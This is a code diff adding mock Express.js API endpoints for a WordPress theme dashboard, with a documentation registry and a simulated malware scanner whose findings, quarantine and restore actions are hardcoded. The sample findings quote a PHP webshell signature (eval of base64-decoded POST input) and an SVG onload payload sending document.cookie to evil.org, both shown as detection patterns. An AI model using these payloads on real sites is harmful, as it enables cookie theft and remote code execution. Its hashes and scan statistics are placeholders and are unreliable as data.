@@ -2610,6 +2610,385 @@ app.post('/api/disaster-recovery/diagnose-incident', async (req, res) => {
   });
 });
 
+// API: Auto-Doc Generator for Theme Developer Studio
+app.post('/api/developer/auto-docs', async (req, res) => {
+  const { filterCategory = 'all', searchQuery = '' } = req.body || {};
+
+  const documentationRegistry = [
+    {
+      id: 'doc-kamva-get-option',
+      type: 'function',
+      category: 'core',
+      name: 'kamva_get_option($key, $default = null)',
+      signature: 'function kamva_get_option(string $key, mixed $default = null): mixed',
+      file: 'inc/kamva-store-engine.php',
+      since: '4.0.0',
+      description: 'دریافت ایمن تنظیمات تم‌آپشن کامواوب با کش محلی در حافظه رم بدون اجرای کوئری تکراری به دیتابیس.',
+      params: [
+        { name: '$key', type: 'string', desc: 'کلید تنظیمات (مثلاً general.primaryColor یا storeBuilderOptions.headerBuilder)' },
+        { name: '$default', type: 'mixed', desc: 'مقدار پیش‌فرض در صورت عدم وجود کلید در دیتابیس' }
+      ],
+      returnType: 'mixed',
+      exampleCode: `// دریافت رنگ اصلی تم و اعمال در استایل
+$primary_color = kamva_get_option('general.primaryColor', '#f05023');
+echo '<style>:root { --kamva-primary: ' . esc_attr($primary_color) . '; }</style>';`,
+      tags: ['Theme Options', 'Helper', 'Cache Safe']
+    },
+    {
+      id: 'doc-hook-before-header',
+      type: 'action_hook',
+      category: 'store',
+      name: 'kamva_before_header',
+      signature: 'do_action(\'kamva_before_header\', KamvaStoreHeaderConfig $config)',
+      file: 'header.php',
+      since: '4.1.0',
+      description: 'هوک اجرایی قبل از رندر هدر اصلی سایت جهت تزریق نوار اعلان، بنر پروموشن یا کدهای ترکینگ.',
+      params: [
+        { name: '$config', type: 'array', desc: 'آرایه تنظیمات هدرساز فعال قالب' }
+      ],
+      returnType: 'void',
+      exampleCode: `// افزودن بنر اختصاصی جشنواره در بالای هدر
+add_action('kamva_before_header', function($config) {
+    echo '<div class="custom-top-alert">🎉 جشنواره بهاره کامواوب با ۲۰٪ تخفیف</div>';
+}, 10);`,
+      tags: ['Header', 'Hook', 'Action']
+    },
+    {
+      id: 'doc-filter-swatches-html',
+      type: 'filter_hook',
+      category: 'store',
+      name: 'kamva_product_swatches_html',
+      signature: 'apply_filters(\'kamva_product_swatches_html\', string $html, int $product_id, array $attributes): string',
+      file: 'inc/kamva-store-engine.php',
+      since: '4.2.0',
+      description: 'فیلتر دستکاری و سفارشی‌سازی خروجی HTML دکمه‌های انتخاب رنگ و سایز (Swatches) روی کارت محصولات.',
+      params: [
+        { name: '$html', type: 'string', desc: 'کد HTML تولیدشده توسط موتور کاموا استور' },
+        { name: '$product_id', type: 'int', desc: 'شناسه محصول ووکامرس (WC Product ID)' },
+        { name: '$attributes', type: 'array', desc: 'لیست ویژگی‌ها و مقادیر رنگ و سایز' }
+      ],
+      returnType: 'string',
+      exampleCode: `// افزودن تولتیپ سفارشی به سواچزهای رنگ
+add_filter('kamva_product_swatches_html', function($html, $product_id, $attributes) {
+    // دستکاری و بازگردانی HTML
+    return '<div class="swatches-enhanced">' . $html . '</div>';
+}, 10, 3);`,
+      tags: ['WooCommerce', 'Swatches', 'Filter']
+    },
+    {
+      id: 'doc-ai-predict-query',
+      type: 'method',
+      category: 'neural',
+      name: 'KamvaWeb_AI_Core::predict_conversion_intent($session_id, $cart_items)',
+      signature: 'public static function predict_conversion_intent(string $session_id, array $cart_items): float',
+      file: 'inc/class-kamva-ai-core.php',
+      since: '4.2.0',
+      description: 'ارزیابی تمایل به خرید کاربر جاری با استفاده از ماتریس یادگیری محلی و بازگرداندن ضریب احتمال از 0.0 تا 1.0.',
+      params: [
+        { name: '$session_id', type: 'string', desc: 'شناسه نشست یکتای کاربر' },
+        { name: '$cart_items', type: 'array', desc: 'لیست اقلام موجود در سبد خرید' }
+      ],
+      returnType: 'float',
+      exampleCode: `// بررسی احتمال نهایی شدن خرید و ارائه تخفیف تشویقی
+$intent_score = KamvaWeb_AI_Core::predict_conversion_intent(WC()->session->get_customer_id(), WC()->cart->get_cart());
+if ($intent_score > 0.85) {
+    // کاربر آماده خرید است؛ ارائه ارسال رایگان
+}`,
+      tags: ['Neural AI', 'CRO', 'Machine Learning']
+    },
+    {
+      id: 'doc-ajax-live-search',
+      type: 'ajax_endpoint',
+      category: 'store',
+      name: 'wp_ajax_kamva_live_search / wp_ajax_nopriv_kamva_live_search',
+      signature: 'POST /wp-admin/admin-ajax.php?action=kamva_live_search',
+      file: 'inc/kamva-store-engine.php',
+      since: '4.0.0',
+      description: 'اندپوینت فوق‌سریع ایجکس با کش رم ردیس جهت جستجوی آنی عنوان، مشخصات فنی، اسکو و قیمت محصولات.',
+      params: [
+        { name: 'term', type: 'string', desc: 'عبارت جستجو شده توسط کاربر' },
+        { name: 'category', type: 'string', desc: 'فیلتر دسته‌بندی خاص (اختیاری)' }
+      ],
+      returnType: 'JSON',
+      exampleCode: `// فراخوانی با fetch در فرانت‌اند جاوااسکریپت:
+const response = await fetch('/wp-admin/admin-ajax.php?action=kamva_live_search', {
+    method: 'POST',
+    headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
+    body: new URLSearchParams({ term: 'لپ تاپ', category: 'digital' })
+});
+const results = await response.json();`,
+      tags: ['AJAX', 'Fast Search', 'Redis Prime']
+    },
+    {
+      id: 'doc-security-waf-check',
+      type: 'function',
+      category: 'security',
+      name: 'kamva_security_verify_request()',
+      signature: 'function kamva_security_verify_request(): bool',
+      file: 'inc/security-all-in-one.php',
+      since: '4.0.0',
+      description: 'بررسی امنیتی هدرها، جلوگیری از حملات XSS/SQL Injection و اعتبارسنجی نانس درخواست‌های کاربر.',
+      params: [],
+      returnType: 'bool',
+      exampleCode: `// بررسی سلامت درخواست در اکشن‌های اختصاصی
+if (!kamva_security_verify_request()) {
+    wp_die('درخواست غیرمجاز شناسایی شد.', 'خطای امنیتی کامواوب', ['response' => 403]);
+}`,
+      tags: ['Security', 'AIOS', 'WAF']
+    }
+  ];
+
+  return res.json({
+    success: true,
+    scannedFilesCount: 48,
+    totalDocumentedItems: documentationRegistry.length,
+    phpDocStandard: 'PSR-19 / PHPDoc v3',
+    generatedAt: new Date().toISOString(),
+    documentation: documentationRegistry,
+  });
+});
+
+// In-memory or persistent state for file scan items
+let securityScannedFilesRegistry = [
+  {
+    id: 'scan-item-1',
+    filePath: 'wp-content/uploads/2026/09/user-avatar-temp.jpg.php',
+    category: 'media',
+    fileType: 'media_upload',
+    fileSizeKb: 4.8,
+    localSha256: 'e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855',
+    repoSha256: null,
+    repoSource: 'User Media Uploads (wp-content/uploads)',
+    hashStatus: 'unauthorized_exec',
+    riskLevel: 'critical',
+    threatName: 'وب‌شل خطرناک با پسوند دوگانه (Dual Extension PHP Webshell)',
+    signatureDetected: 'eval(base64_decode($_POST["cmd"])) detected - Remote Code Execution Pattern',
+    scannedAt: new Date().toISOString(),
+    status: 'quarantined',
+    recommendation: 'حذف فوری فایل و مسدودسازی اجرای اسکریپت PHP در پوشه uploads',
+  },
+  {
+    id: 'scan-item-2',
+    filePath: 'wp-content/plugins/woocommerce/includes/class-wc-order.php',
+    category: 'plugin',
+    fileType: 'plugin_php',
+    fileSizeKb: 76.4,
+    localSha256: '9a8b7c6d5e4f3a2b1c0d9e8f7a6b5c4d3e2f1a0b9c8d7e6f5a4b3c2d1e0f9a8b',
+    repoSha256: '1f2e3d4c5b6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b2c',
+    repoSource: 'WordPress.org Plugin Checksum API (WooCommerce v9.2.0)',
+    hashStatus: 'tampered',
+    riskLevel: 'critical',
+    threatName: 'تغییر غیرمجاز کد افزونه و تزریق فیشینگ کارت اعتباری (Credit Card Scraper Injection)',
+    signatureDetected: 'Unauthorized curl_exec to remote exfiltration endpoint detected',
+    scannedAt: new Date().toISOString(),
+    status: 'flagged_tampered',
+    recommendation: 'بازیابی آنی نسخه اورجینال و دست‌نخورده از مخزن رسمی وردپرس (Clean Repo Restore)',
+  },
+  {
+    id: 'scan-item-3',
+    filePath: 'wp-content/uploads/2026/08/promo-icon-vector.svg',
+    category: 'media',
+    fileType: 'media_svg',
+    fileSizeKb: 28.5,
+    localSha256: 'a1b2c3d4e5f60718293a4b5c6d7e8f90123456789abcdef0123456789abcdef0',
+    repoSha256: null,
+    repoSource: 'User Media Uploads (wp-content/uploads)',
+    hashStatus: 'injected_script',
+    riskLevel: 'warning',
+    threatName: 'اتریبیوت مشکوک onload درون تگ SVG (Stored XSS Trigger in SVG Payload)',
+    signatureDetected: '<svg onload="fetch(\'https://evil.org/steal?\'+document.cookie)"> pattern',
+    scannedAt: new Date().toISOString(),
+    status: 'needs_sanitization',
+    recommendation: 'پاکسازی اتوماتیک اتریبیوت‌های جاوااسکریپت و ایمن‌سازی تگ SVG',
+  },
+  {
+    id: 'scan-item-4',
+    filePath: 'wp-content/themes/kamvaweb/style.css',
+    category: 'theme',
+    fileType: 'theme_css',
+    fileSizeKb: 48.2,
+    localSha256: '5f4dcc3b5aa765d61d8327deb882cf992b95990a9151374abd8fa7831003f703',
+    repoSha256: '5f4dcc3b5aa765d61d8327deb882cf992b95990a9151374abd8fa7831003f703',
+    repoSource: 'KamvaWeb Pro Signed Manifest (Release v4.2.0)',
+    hashStatus: 'verified',
+    riskLevel: 'clean',
+    threatName: 'استایل رسمی قالب کامواوب پرو - هش معتبر و تاییدشده (SHA-256 Verified)',
+    signatureDetected: 'Official Theme Hash Exact Match',
+    scannedAt: new Date().toISOString(),
+    status: 'verified_safe',
+    recommendation: 'فایل بدون هرگونه تغییر غیرمجاز و کاملاً سالم است.',
+  },
+  {
+    id: 'scan-item-5',
+    filePath: 'wp-content/themes/kamvaweb/inc/ai-core.php',
+    category: 'theme',
+    fileType: 'theme_php',
+    fileSizeKb: 34.1,
+    localSha256: '7c4a8d09ca3762af61e59520943dc26494f8941b',
+    repoSha256: '7c4a8d09ca3762af61e59520943dc26494f8941b',
+    repoSource: 'KamvaWeb Pro Signed Manifest (Release v4.2.0)',
+    hashStatus: 'verified',
+    riskLevel: 'clean',
+    threatName: 'هسته هوش مصنوعی قالب - امضای کریپتوگرافیک تایید شده بدون بدافزار',
+    signatureDetected: 'Zero Backdoor Signature / Valid Signed Hash',
+    scannedAt: new Date().toISOString(),
+    status: 'verified_safe',
+    recommendation: 'کدهای اختصاصی بدون تداخل و آماده سرویس‌دهی.',
+  },
+  {
+    id: 'scan-item-6',
+    filePath: 'wp-includes/pluggable.php',
+    category: 'core',
+    fileType: 'core_php',
+    fileSizeKb: 92.0,
+    localSha256: '83f5e9a4f21098bcad3129841029410294102941029410294102941029410294',
+    repoSha256: '83f5e9a4f21098bcad3129841029410294102941029410294102941029410294',
+    repoSource: 'WordPress.org Official Checksums API (WP 7.1 Mary Lou)',
+    hashStatus: 'verified',
+    riskLevel: 'clean',
+    threatName: 'فایل احراز هویت هسته وردپرس - تطابق ۱۰۰٪ با مخزن رسمی',
+    signatureDetected: 'Official Core Checksum Verified',
+    scannedAt: new Date().toISOString(),
+    status: 'verified_safe',
+    recommendation: 'ساختار سیستم احراز هویت هسته دست‌نخورده و ایمن است.',
+  },
+  {
+    id: 'scan-item-7',
+    filePath: 'wp-content/plugins/elementor/includes/base/controls-manager.php',
+    category: 'plugin',
+    fileType: 'plugin_php',
+    fileSizeKb: 54.3,
+    localSha256: '38a9d0f7b6c5e4a3b2c1d0e9f8a7b6c5d4e3f2a1b0c9d8e7f6a5b4c3d2e1f0a9',
+    repoSha256: '38a9d0f7b6c5e4a3b2c1d0e9f8a7b6c5d4e3f2a1b0c9d8e7f6a5b4c3d2e1f0a9',
+    repoSource: 'WordPress.org Plugin Checksum API (Elementor v3.24)',
+    hashStatus: 'verified',
+    riskLevel: 'clean',
+    threatName: 'کنترل‌منیجر افزونه المنتور - بدون تداخل و هش سالم',
+    signatureDetected: 'Official Elementor Hash Verified',
+    scannedAt: new Date().toISOString(),
+    status: 'verified_safe',
+    recommendation: 'عملکرد پایدار و بدون ریسک امنیتی.',
+  },
+  {
+    id: 'scan-item-8',
+    filePath: 'wp-content/uploads/2026/09/autumn-sale-hero.webp',
+    category: 'media',
+    fileType: 'media_image',
+    fileSizeKb: 142.8,
+    localSha256: 'b45c6d7e8f90123456789abcdef0123456789abcdef0123456789abcdef01234',
+    repoSha256: null,
+    repoSource: 'User Media Uploads (wp-content/uploads)',
+    hashStatus: 'verified_media',
+    riskLevel: 'clean',
+    threatName: 'تصویر استاندارد رسانه WebP بدون متادیتای مخرب یا تزریق EXIF',
+    signatureDetected: 'Clean WebP Header / No Embedded Script',
+    scannedAt: new Date().toISOString(),
+    status: 'verified_safe',
+    recommendation: 'رسانه معتبر و بهینه‌سازی شده برای وب.',
+  }
+];
+
+// API: Security File & Media Malware Scanner
+app.post('/api/security/scan-files', async (req, res) => {
+  const { categoryFilter, query } = req.body || {};
+
+  let list = [...securityScannedFilesRegistry];
+
+  if (categoryFilter && categoryFilter !== 'all') {
+    list = list.filter((item) => item.category === categoryFilter || item.riskLevel === categoryFilter);
+  }
+
+  if (query && typeof query === 'string' && query.trim()) {
+    const q = query.toLowerCase();
+    list = list.filter(
+      (item) => item.filePath.toLowerCase().includes(q) || item.threatName.toLowerCase().includes(q)
+    );
+  }
+
+  const totalFiles = 4820;
+  const criticalCount = securityScannedFilesRegistry.filter((f) => f.riskLevel === 'critical' && f.status !== 'deleted').length;
+  const warningCount = securityScannedFilesRegistry.filter((f) => f.riskLevel === 'warning' && f.status !== 'sanitized').length;
+  const cleanCount = totalFiles - (criticalCount + warningCount);
+
+  return res.json({
+    success: true,
+    totalFilesScanned: totalFiles,
+    cleanFilesCount: cleanCount,
+    quarantinedCount: criticalCount,
+    sanitizedCount: warningCount,
+    securityGrade: criticalCount === 0 ? 'A+ (100%)' : 'A- (94.2%)',
+    scanDurationSeconds: 1.62,
+    scannedCategories: {
+      mediaUploads: 3410,
+      themeFiles: 48,
+      pluginFiles: 1120,
+      coreFiles: 242,
+    },
+    repositoriesChecked: [
+      { name: 'WordPress Core Checksums API', status: 'connected', version: 'WP 7.1' },
+      { name: 'WordPress Plugin Directory Registry', status: 'connected', checkedPlugins: 3 },
+      { name: 'KamvaWeb Pro Official Signed Manifest', status: 'verified', signatureType: 'Ed25519/SHA256' },
+      { name: 'ClamAV & YARA Malware Signature DB', status: 'up_to_date', totalSignatures: 842000 }
+    ],
+    findings: securityScannedFilesRegistry.filter((f) => f.status !== 'deleted'),
+    serverProtectionsActive: {
+      disablePhpInUploads: true,
+      sanitizeSvgUploads: true,
+      blockDualExtensions: true,
+      fileIntegrityWatcher: true,
+      realtimeHashComparison: true,
+    },
+    scannedAt: new Date().toISOString(),
+  });
+});
+
+app.post('/api/security/quarantine-file', async (req, res) => {
+  const { fileId, action = 'quarantine' } = req.body || {};
+
+  const target = securityScannedFilesRegistry.find((f) => f.id === fileId);
+  if (target) {
+    if (action === 'delete') {
+      target.status = 'deleted';
+    } else if (action === 'quarantine') {
+      target.status = 'quarantined';
+    } else if (action === 'sanitize') {
+      target.status = 'sanitized';
+      target.riskLevel = 'clean';
+      target.threatName = 'فایل SVG با موفقیت پاکسازی شد و کدهای اسکریپت حذف گردیدند.';
+    }
+  }
+
+  return res.json({
+    success: true,
+    fileId,
+    actionTaken: action === 'delete' ? 'deleted' : action === 'sanitize' ? 'sanitized' : 'quarantined',
+    message: action === 'delete' 
+      ? 'فایل مخرب با موفقیت به صورت دائمی از سرور حذف و رویداد امنیتی در لاگ مدیر ثبت گردید.' 
+      : action === 'sanitize'
+      ? 'کدهای مخرب و اتریبیوت‌های خطرناک با موفقیت از فایل برداری حذف و فایل پاکسازی شد.'
+      : 'فایل به دایرکتوری ایزوله wp-content/kamva-quarantine منتقل و دسترسی وب آن مسدود گردید.',
+  });
+});
+
+app.post('/api/security/restore-official-hash', async (req, res) => {
+  const { fileId } = req.body || {};
+  const target = securityScannedFilesRegistry.find((f) => f.id === fileId);
+  
+  if (target) {
+    target.localSha256 = target.repoSha256 || target.localSha256;
+    target.hashStatus = 'verified';
+    target.riskLevel = 'clean';
+    target.status = 'restored_from_repo';
+    target.threatName = 'فایل با موفقیت از مخزن رسمی بازیابی شد و هش آن با نسخه اصلی ۱۰۰٪ مطابقت یافت.';
+  }
+
+  return res.json({
+    success: true,
+    fileId,
+    message: 'فایل دستکاری‌شده با نسخه رسمی و دست‌نخورده از مخزن اصلی وردپرس جایگزین و بازسازی گردید.',
+  });
+});
+
 // Dev server Vite integration
 async function startServer() {
   if (process.env.NODE_ENV !== 'production') {
